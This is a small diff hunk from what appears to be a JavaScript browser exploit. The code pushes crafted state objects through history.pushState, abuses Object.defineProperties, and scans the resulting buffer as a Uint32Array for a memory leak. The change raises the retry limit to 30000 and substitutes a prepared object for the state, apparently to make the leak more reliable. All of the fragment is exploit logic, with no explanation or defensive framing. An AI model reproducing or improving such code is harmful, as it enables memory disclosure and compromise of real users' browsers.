@@ -143,10 +143,10 @@ props[i++]={value:tgt};
   
 var foundLeak=undefined;
 var foundIndex=0;
-var maxCount=256;
+var maxCount=30000;
 while(foundLeak==undefined&&maxCount>0){
 maxCount--;
-history.pushState({'page_id':1,'user_id':5},"");
+history.pushState(y,"");
 Object.defineProperties({},props);
 var leak=new Uint32Array(history.state.data.buffer);
 for(var i=0;i<leak.length-6;i++){
